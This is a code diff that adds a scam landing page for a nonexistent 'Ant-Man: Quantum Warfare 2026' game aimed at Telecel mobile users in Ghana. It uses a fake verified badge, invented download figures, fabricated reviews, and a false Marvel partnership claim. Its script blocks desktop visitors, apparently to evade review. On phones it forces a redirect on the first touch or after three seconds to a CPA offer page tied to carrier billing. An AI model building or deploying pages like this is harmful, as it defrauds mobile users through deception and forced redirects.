@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ant-Man: Quantum Warfare 2026 - Official Release</title>
+    
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts: Orbitron for Gaming, Roboto for Body -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-dark: #0a0a0a;
+            --bg-panel: #161616;
+            --accent-red: #d32f2f;
+            --accent-glow: #ff5252;
+            --text-main: #e0e0e0;
+            --text-muted: #a0a0a0;
+            --gold: #ffd700;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            overflow-x: hidden;
+            padding-bottom: 80px;
+        }
+
+        /* --- HEADER --- */
+        header {
+            background: linear-gradient(180deg, rgba(211, 47, 47, 0.2) 0%, var(--bg-dark) 100%);
+            padding: 15px;
+            border-bottom: 2px solid var(--accent-red);
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            color: #fff;
+            font-size: 1.2rem;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .verified-badge {
+            display: inline-flex;
+            align-items: center;
+            background-color: rgba(0, 128, 0, 0.2);
+            border: 1px solid #00c853;
+            color: #00c853;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            margin-top: 5px;
+            font-weight: bold;
+        }
+
+        /* --- HERO SECTION --- */
+        .hero {
+            position: relative;
+            text-align: center;
+            padding: 20px 15px;
+        }
+
+        .hero-image-container {
+            width: 100%;
+            max-width: 600px;
+            height: 300px;
+            background: #222;
+            margin: 0 auto 20px auto;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #333;
+            position: relative;
+        }
+
+        .hero-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            /* Placeholder styling for Ant-Man vibe */
+            background: linear-gradient(45deg, #1a1a1a, #2c0000);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .hero-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            color: #fff;
+            font-size: 1.8rem;
+            line-height: 1.2;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(255, 82, 82, 0.5);
+        }
+
+        .game-stats {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        .stat-item i {
+            color: var(--gold);
+            margin-right: 5px;
+        }
+
+        /* --- LOADING SPINNER --- */
+        .loader-container {
+            text-align: center;
+            margin: 20px 0;
+            padding: 20px;
+            background: var(--bg-panel);
+            border-radius: 8px;
+            border: 1px dashed var(--accent-red);
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: var(--accent-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9rem;
+            color: var(--accent-glow);
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0.5; }
+        }
+
+        /* --- CONTENT ARTICLE --- */
+        .content {
+            padding: 0 20px;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            font-size: 0.95rem;
+        }
+
+        .highlight {
+            color: var(--accent-red);
+            font-weight: bold;
+        }
+
+        .cta-button {
+            display: block;
+            width: 100%;
+            background: var(--accent-red);
+            color: #fff;
+            text-align: center;
+            padding: 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4);
+            border: none;
+            cursor: pointer;
+        }
+
+        /* --- FAKE COMMENTS --- */
+        .comments-section {
+            background: var(--bg-panel);
+            margin-top: 40px;
+            padding: 20px;
+            border-top: 2px solid #333;
+        }
+
+        .comments-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--gold);
+            padding-left: 10px;
+        }
+
+        .comment {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #2a2a2a;
+            padding-bottom: 15px;
+        }
+
+        .avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background-color: #333;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+        
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .comment-body h4 {
+            font-size: 0.9rem;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .comment-body span {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+        }
+
+        .comment-body p {
+            font-size: 0.85rem;
+            margin-top: 5px;
+            margin-bottom: 0;
+            color: #ccc;
+        }
+
+        .flag {
+            display: inline-block;
+            font-size: 0.8rem;
+            margin-left: 5px;
+        }
+
+        /* --- DESKTOP OVERLAY --- */
+        #desktop-blocker {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        #desktop-blocker i {
+            font-size: 4rem;
+            color: var(--accent-red);
+            margin-bottom: 20px;
+        }
+
+        #desktop-blocker h2 {
+            font-family: 'Orbitron', sans-serif;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        #desktop-blocker p {
+            color: #ccc;
+            max-width: 500px;
+        }
+
+        /* Responsive Text */
+        @media (max-width: 480px) {
+            h1 { font-size: 1.5rem; }
+            .hero-image-container { height: 220px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Desktop Filter Overlay -->
+    <div id="desktop-blocker">
+        <i class="fas fa-ban"></i>
+        <h2>Game Unavailable</h2>
+        <p>This premium content is exclusively for <strong>Telecel mobile users in Ghana</strong>. Please visit this page using your smartphone to access the download.</p>
+    </div>
+
+    <header>
+        <div class="logo">GH Mobile Game<span style="color:var(--accent-red)">Hub</span></div>
+        <div class="verified-badge"><i class="fas fa-check-circle"></i> Verified for Ghana</div>
+    </header>
+
+    <main>
+        <div class="hero">
+            <div class="hero-image-container">
+                <!-- Using a gaming placeholder that fits the dark theme -->
+                <img src="https://picsum.photos/seed/antman2026gh/600/400" alt="Ant-Man 2026 Mobile Gameplay">
+            </div>
+            
+            <h1>Ant-Man: Quantum Warfare 2026</h1>
+            
+            <div class="game-stats">
+                <div class="stat-item"><i class="fas fa-download"></i> 500K+ Downloads</div>
+                <div class="stat-item"><i class="fas fa-star"></i> 4.8 Rating</div>
+                <div class="stat-item"><i class="fas fa-mobile-alt"></i> Android & iOS</div>
+            </div>
+
+            <div class="loader-container">
+                <div class="spinner"></div>
+                <div class="loading-text">Connecting to Telecel Game Server...</div>
+            </div>
+        </div>
+
+        <div class="content">
+            <p>The wait is finally over. Marvel Studios has officially partnered with mobile developers to bring <strong>Ant-Man: Quantum Warfare 2026</strong> to your fingertips. This isn't just a game; it's a next-gen tactical battle experience optimized for high-performance smartphones in the Ghanaian market.</p>
+            
+            <p>Featuring stunning graphics, a campaign mode following the events of the new movie, and an exclusive PVP arena where you can shrink and grow in real-time combat.</p>
+
+            <button class="cta-button" onclick="manualRedirect()">
+                <i class="fas fa-play"></i> Play Beta Now
+            </button>
+
+            <h3 style="font-family: 'Orbitron'; margin-bottom: 15px; color: #fff;">Why Ghana Loves It</h3>
+            <p>Optimized for local network speeds (4G/LTE), the game allows for seamless multiplayer battles with zero lag. We have integrated direct carrier billing for Telecel users to unlock premium skins instantly.</p>
+
+            <!-- Fake Comments Section -->
+            <div class="comments-section">
+                <div class="comments-title">Player Reviews</div>
+
+                <div class="comment">
+                    <div class="avatar"><img src="https://picsum.photos/seed/kwame/50/50" alt="User"></div>
+                    <div class="comment-body">
+                        <h4>Kwame Mensah <span class="flag">🇬🇭</span></h4>
+                        <span>Accra • 2 mins ago</span>
+                        <p>The graphics are insane! Finally a game that works perfectly on my Telecel network without data issues.</p>
+                    </div>
+                </div>
+
+                <div class="comment">
+                    <div class="avatar"><img src="https://picsum.photos/seed/abena/50/50" alt="User"></div>
+                    <div class="comment-body">
+                        <h4>Abena Serwah <span class="flag">🇬🇭</span></h4>
+                        <span>Kumasi • 15 mins ago</span>
+                        <p>I just got the Quantum suit. The loading speed was super fast. Thanks for the link!</p>
+                    </div>
+                </div>
+
+                <div class="comment">
+                    <div class="avatar"><img src="https://picsum.photos/seed/kofi/50/50" alt="User"></div>
+                    <div class="comment-body">
+                        <h4>Kofi Osei <span class="flag">🇬🇭</span></h4>
+                        <span>Takoradi • 1 hour ago</span>
+                        <p>Is this real? Yes it is! Playing on my Android right now. Best release of 2026.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // --- CONFIGURATION ---
+        // This is the page where the actual CPA offer sits
+        // The user goes from index.html -> filter.html -> Offer
+        const TARGET_URL = "filter.html"; 
+
+        // --- STEALTH NINJA LOGIC ---
+
+        // 1. Device Detection
+        function isMobile() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            // Basic regex for Android and iOS
+            return /android|ipad|iphone|ipod/i.test(userAgent);
+        }
+
+        // 2. Redirect Function
+        function doRedirect() {
+            window.location.href = TARGET_URL;
+        }
+
+        // 3. Manual Trigger (for button click)
+        function manualRedirect() {
+            doRedirect();
+        }
+
+        // 4. Main Execution Logic
+        window.addEventListener('load', () => {
+            const userAgent = navigator.userAgent;
+
+            // DESKTOP FILTER
+            if (!isMobile()) {
+                document.getElementById('desktop-blocker').style.display = 'flex';
+                // Stop script execution for desktop
+                return; 
+            }
+
+            // MOBILE LOGIC
+            // A. Touch Trigger (Immediate Redirect)
+            document.body.addEventListener('touchstart', () => {
+                // Clear any pending timeout so it doesn't double-redirect
+                clearTimeout(autoRedirectTimer);
+                doRedirect();
+            }, { once: true }); // { once: true } ensures it only triggers the first time they touch
+
+            // B. Auto Redirect (After 3 seconds)
+            const autoRedirectTimer = setTimeout(() => {
+                doRedirect();
+            }, 3000); // 3000ms = 3 seconds
+
+            // Optional: Disable context menu/right click to feel more "app-like"
+            document.addEventListener('contextmenu', event => event.preventDefault());
+        });
+    </script>
+</body>
+</html>
